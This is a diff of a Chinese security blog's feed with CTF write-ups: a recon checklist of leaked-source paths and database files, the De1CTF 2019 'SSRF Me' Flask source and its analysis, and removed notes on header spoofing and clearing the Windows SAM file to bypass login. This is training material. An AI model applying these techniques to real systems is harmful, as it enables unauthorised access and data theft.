+<p>解题思路： 查看页面源代码，发现一段注释代码，代码中已经给出了用户名和密码，但是若有表单提交密码就会被加密，所以用hackbar工具，POST提交username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04 ，得到flag。</p>
+<h2 id="web20"><strong>web20</strong></h2>
+<p>题目：</p>
+<p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p>
+<p>我是asp程序，我用的access数据库</p>
+<p>直接查看url路径添加/db/db.mdb</p>
+<p>下载之后，txt打开</p>
+<p>control+f找flag</p>
+<p>这里好像是需要用 sqlmap or 御剑来获取accesss数据库</p>
+<h2 id="小结">小结</h2>
 <ul>
-<li>
-<p><strong>HTTP Method</strong></p>
-<p>HTTP Method是可以自定义的，且区分大小写。</p>
-<ul>
-<li>
-<p>HTTP/1.1协议中共定义了八种方法（有时也叫“动作”）来表明Request-URI指定的资源的不同操作方式：</p>
-<p><strong>OPTIONS</strong><br>
-返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送'*'的请求来测试服务器的功能性。<br>
-<strong>HEAD</strong><br>
-向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。<br>
-<strong>GET</strong><br>
-向特定的资源发出请求。注意：GET方法不应当被用于产生“副作用”的操作中。<br>
-<strong>POST</strong><br>
-向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。<br>
-<strong>PUT</strong><br>
-向指定资源位置上传其最新内容。<br>
-<strong>DELETE</strong><br>
-请求服务器删除Request-URI所标识的资源。<br>
-<strong>TRACE</strong><br>
-回显服务器收到的请求，主要用于测试或诊断。<br>
-<strong>CONNECT</strong><br>
-HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p>
-</li>
+<li>源代码 前端</li>
+<li>js前台拦截</li>
+<li>抓包：响应头</li>
+<li>robots.txt</li>
+<li>phps源码泄露     index.phps</li>
+<li>网站源码 www.zip</li>
+<li>版本控制工具git     svn  .git .svn</li>
+<li>Linux     vim异常关闭 保留临时文件.swp index.php.swp</li>
+<li>cookie</li>
+<li>查看域名 http://dbcha.com/</li>
+<li>/admin 后台</li>
+<li>网站中找到技术文件document     查看默认账号密码</li>
+<li>源码泄露editor信息</li>
+<li>公开信息qq信息 - 密保</li>
+<li>网站测试探针 雅黑探针 /tz.php     查看php参数 - phpinfo</li>
+<li>前端出现密钥 hackbar     post提交</li>
+<li>asp+access框架数据库   /db/db.mdb</li>
 </ul>
-</li>
-<li>
-<p>CTF</p>
-<p>1.要求从某个<strong>IP或者主机</strong>访问，一般是修改 X-Forwarded-For，X-Forwarded-Host，CLIENT-IP,host的参数的值</p>
-<p>2.要求从<strong>某个国家</strong>访问，一般修改Accept-Language值</p>
-<p>3.要求从<strong>某个页面</strong>访问就修改referer，有关身份认证类的一般再修改cookie的值</p>
-</li>
-</ul>
-<h1 id="windows基础学习笔记一">Windows基础学习笔记(一)</h1>
-<h2 id="c盘根目录常见文件夹">C盘根目录常见文件夹</h2>
-<ul>
-<li>
-<p><strong>Documents and Settings/用户</strong>： Windows7中的“用户”文件夹其实就是XP中的 Documents andSettings文件夹，这里储存了用户的设置，包括用户文档、上网浏览信息、配置文件等数据。</p>
-</li>
-<li>
-<p><strong>Downloads</strong>：这通常是下载软件的默认下载路径，<br>
-建议修改软件设置改到其他硬盘分区。</p>
-</li>
-<li>
-<p><strong>Drivers</strong>：部分驱动程序的文件夹。在etc中，用文本打开其中的hosts，其中的资料主要用来解析域名。</p>
-</li>
-<li>
-<p>Favorites：收藏夹。</p>
-</li>
-<li>
-<p><strong>Program Files</strong>：应用程序文件夹，一般软件默认都安装在这里，也有一些系统自带的应用程序。Windows7系统中，64位用户会多出一个 ProgramFies（X86）文件夹，这是系统中32位软件的安装目录</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[De1CTF 2019]SSRF Me]]></title>
+        <id>https://Ro1ing.github.io/post/de1ctf-2019ssrf-me/</id>
+        <link href="https://Ro1ing.github.io/post/de1ctf-2019ssrf-me/">
+        </link>
+        <updated>2021-01-30T06:36:47.000Z</updated>
+        <content type="html"><![CDATA[<p>看下源码</p>
+<pre><code class="language-python">#! /usr/bin/env python #encoding=utf-8
+from flask import Flask 
+from flask import request 
+import socket 
+import hashlib 
+import urllib 
+import sys 
+import os 
+import json 
+reload(sys) 
+sys.setdefaultencoding('latin1') 
+app = Flask(__name__) 
+secert_key = os.urandom(16) 
+class Task: 
+def __init__(self, action, param, sign, ip): 
+self.action = action 
+self.param = param 
+self.sign = sign 
+self.sandbox = md5(ip) 
+if(not os.path.exists(self.sandbox)): 
+#SandBox For Remote_Addr os.mkdir(self.sandbox) 
+def Exec(self): result = {} result['code'] = 500 
+if (self.checkSign()): 
+if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500 result['msg'] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan. @app.route(&quot;/geneSign&quot;, methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route('/De1ta',methods=['GET','POST']) def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route('/') def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80)
+
+</code></pre>
+<p><strong>SSRF 服务器请求伪造</strong></p>
 <blockquote>
-<p>Common Files：共用程序文件夹，用于同系列不同程序软件共同使用或调用数据，比如微软和Adob的各种软件。</p>
-<p>ComPlus Applications：微软COM+组件使用的文件夹，删除后可能引起COM+组件不能运行。<br>
-DFX：DFX是一种高效的XML索引方法，此文件夹与数据索引有关，不可以删除。</p>
+<p>SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
 </blockquote>
-</li>
-<li>
-<p><strong>Program Data</strong>： Windows7的系统文件夹，放置程序的使用数据、设置等文件，不建议删除。Windows：存放操作系统主要文件，非常重要。</p>
-</li>
-<li>
-<p>Temp：存放系统或其他软件临时文件，需经常清理</p>
-</li>
-<li>
-<p>hiberfil.sys：系统的休眠功能所占用的硬盘空间的文件，不建议删除。</p>
-</li>
-<li>
-<p>pagefile.sys：虛拟内存页面文件，不建议删除。</p>
-</li>
-<li>
-<p>PerfLogs： Windows vista或 Windows7系统日志，记录如磁盘扫描错误等信息，没有必要删除。</p>
-</li>
-<li>
-<p>Internet Explorer：系统自带的浏览器，删除后可能导致部分程序不能正常运行。</p>
-</li>
-<li>
-<p>Install Shield Installation Information：专门存储安装程序信息的文件夹，用于某些程序的卸载和更新。</p>
-</li>
-<li>
-<p>MSECache： MS Office运行时自动创建。</p>
-</li>
-<li>
-<p>MSXML60：微软ⅩML解析器程序的文件夹。</p>
-</li>
-<li>
-<p>microsoft frontpage： FrontPage是微软推出的款网页设计软件，此文件夹通常为空。</p>
-</li>
-<li>
-<p>Movie maker：系统自带的一款视频编辑软件。</p>
-</li>
-<li>
-<p>MSN Gaming Zone：一些系统自带的扑克牌等小游戏，可以删除。</p>
-</li>
-<li>
-<p>Netmeeting：系统自带的网上聊天软件。</p>
-</li>
-<li>
-<p>Outlook Express： Outlook Express WIndows内置的邮件收发端，不用可删。</p>
-</li>
-<li>
-<p>Online Services：网络服务文件夹，不能删。</p>
-</li>
-<li>
-<p>Windows Media Player：系统自带的一款多媒体播放器。</p>
-</li>
-<li>
-<p>WinRAR：一款流行的压缩解压缩软件。</p>
-</li>
-<li>
-<p>Xerox：用作自带的一些图像处理软件的临时空间，文件夹不能删除，但通常为空。</p>
-</li>
-</ul>
-<h3 id="system32-保存系统的配置文件"><strong>system32</strong> --保存系统的配置文件</h3>
+<p><strong>Flask 框架</strong></p>
 <blockquote>
-<p>System\config下有一个SAM文件，这个文件就是用来保存用户的账号和密码的</p>
-<p>对于win10系统来说，进到这个目录，首先就需要管理员权限，其次就算你进来了，这种东西都是一个被锁定的文件，在系统启动的时候他就已经被系统调动了，如果你想打开这个文件，电脑首先就会显示此文件已经被占用，具体的显示内容为“另一个程序正在使用此文件，进程无法访问。假设现在我们需要尝试渗透一个系统的一块软件数据，那么我们首先就要登陆进这个系统，打开软件才能拷贝数据，而且进去还不能靠改他的密码，这种解决方法就是，首先把SAM拷贝出来一份，然后用PE工具把他清掉，再登录系统的时候就可以不需要密码了，然后该做什么做什么，做完了以后重新进入PE，把之前我们备份的SAM再放进去。其实PE本身已经足够我们直接进入系统，但我们要知道，如果没有最终以用户的形式进入那个系统的话，我们就算找到了那个软件，那个软件本身也是不可读的，所以还是要有这种先将用户密码清除在从用户进入的过程。</p>
+<p>​	Flask是一个用Python编写的Web应用程序框架，它基于Werkzeug WSGI工具包和Jinja2模板引擎。</p>
+<p>​	Flask也被称为“microframework” ，因为它使用简单的核心，用extension增加其他功能，它没有默认使用的数据库、窗体验证工具。</p>
+<p>from flask import Flask<br>
+app = Flask(<strong>name</strong>)</p>
+<p>@app.route('/')<br>
+def hello_world():<br>
+return 'Hello, World!'</p>
 </blockquote>
-<h2 id="windows常见服务">Windows常见服务</h2>
-<p><u>Web</u>服务，<u>DNS</u>服务，<u>DHCP</u>服务，<u>邮件</u>服务，<u>Telnet</u>服务，<u>SSH</u>服务，<u>FTP</u>服务，<u>SMB</u>服务</p>
-<ul>
-<li>
-<p>Web服务</p>
+<p><strong>@app.route和其它装饰器</strong></p>
 <blockquote>
-<p>Web服务是一种<a href="https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8B%99%E5%B0%8E%E5%90%91%E6%9E%B6%E6%A7%8B">服务导向架构</a>的技术，通过标准的<a href="https://zh.wikipedia.org/wiki/Web">Web</a>协议提供服务，目的是保证不同平台的应用服务可以互操作。根据<a href="https://zh.wikipedia.org/wiki/W3C">W3C</a>的定义，<strong>Web服务</strong>（Web service）应当是一个<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6">软件</a>系统，用以支持<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C">网络</a>间不同机器的互动操作。网络服务通常是许多<a href="https://zh.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3">应用程序接口</a>（<a href="https://zh.wikipedia.org/wiki/API">API</a>）所组成的，它们透过网络，例如国际互联网（<a href="https://zh.wikipedia.org/wiki/Internet">Internet</a>）的远程<a href="https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>端，执行客户所提交服务的请求。Web service是一个<a href="https://baike.baidu.com/item/%E5%B9%B3%E5%8F%B0/1064049">平台</a>独立的，低耦合的，自包含的、基于可<a href="https://baike.baidu.com/item/%E7%BC%96%E7%A8%8B">编程</a>的web的应用程序，可使用开放的<a href="https://baike.baidu.com/item/XML">XML</a>（<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/6805073">标准通用标记语言</a>下的一个子集）<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86/219665">标准</a>来<a href="https://baike.baidu.com/item/%E6%8F%8F%E8%BF%B0/8928757">描述</a>、发布、发现、协调和配置这些应用程序，用于开发分布式的互操作的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445">应用程序</a>。</p>
+<p>要想明白“@app.route()”的工作原理，我们首先需要看一看Python中的装饰器（就是以“@”开头的那玩意，下面接着函数定义）。</p>
+<p>究竟什么是装饰器？没啥特别的。装饰器只是一种接受函数（就是那个你用“@”符号装饰的函数）的函数，并返回一个新的函数。</p>
+<p>当你装饰一个函数，意味着你告诉Python调用的是那个由你的装饰器返回的新函数，而不仅仅是直接返回原函数体的执行结果。</p>
 </blockquote>
-</li>
-</ul>
+<p>出题人给了hint:hint for [SSRF Me]: flag is in ./flag.txt</p>
+<figure data-type="image" tabindex="1"><img src="1.png" alt="" loading="lazy"></figure>
+<p>geneSign()    获得param参数，通过action和param生成签名</p>
+<p>challenge()    获得cookies中的action和sign,再去通过url传参获取param,并且使用Task对象，通过json返回Exec()方法</p>
+<p>index    得到源码</p>
+<figure data-type="image" tabindex="2"><img src="2.png" alt="" loading="lazy"></figure>
+<p>在执行Exec方法的时候，调用</p>
+<p>将传入的action和param参数和传入的sign参数进行比较。若相等则执行后面的操作。</p>
+<p>所以只要我们后面传入的param和路由/De1ta下传入的param一样，然后action也等于scan。并且将/geneSign路由下返回的sign一样，就可以了。</p>
+<p>看scan这个方法，就是访问param的网址，并将其内容的前50个字母返回回来。</p>
+<figure data-type="image" tabindex="3"><img src="data:image/png;base64,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" alt="" loading="lazy"></figure>
+<p>于是在/geneSign路由下将param传参如下:</p>
+<p>返回了我们自己构建的sign。</p>
+<figure data-type="image" tabindex="4"><img src="data:image/png;base64,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